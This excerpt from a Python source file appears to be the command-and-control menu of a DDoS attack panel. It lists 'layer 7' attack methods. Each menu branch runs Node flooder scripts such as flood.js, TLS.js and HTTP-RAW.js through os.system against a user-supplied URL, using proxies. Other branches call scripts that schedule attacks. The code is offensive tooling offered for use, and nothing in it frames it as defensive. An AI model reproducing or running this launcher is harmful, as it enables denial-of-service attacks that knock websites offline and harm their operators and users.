...
def methods():
    ...
    default_methods = [
        ...
        {"name": "BROWSER", "description": "layer 7 - Attack Url [normal]", "duration": "86000"},
...
""")
                    os.system(f'cd meth && node suki.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node god.js {url} {duration} 32 2')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node zero-bypass2.js {url} {duration} 32 2 proxy.txt')
                    os.system(f'cd meth && node workss.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node glory.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node bypass {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node flood.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node HTTPS.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node HTTP-X.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node TLS.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node hold.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node Storm.js {url} {duration} 32 2 proxy.txt')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node MIX.js {url} {duration} 32 2')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node HTTP-RAW.js {url} {duration}')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
\033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
""")
                    os.system(f'cd meth && node ninja.js {url} {duration}')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
...
""")
                    os.system(f'cd assets && python3 api.py {url} {port} {duration} {method}')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
            ...
            try:
                ...
                os.system(f'cd assets && python3 sch.py {url} {port} {duration} {method} {schedule_time}')
            except ValueError:
                print("(cnc) wrong format")
                main()
            except IndexError:
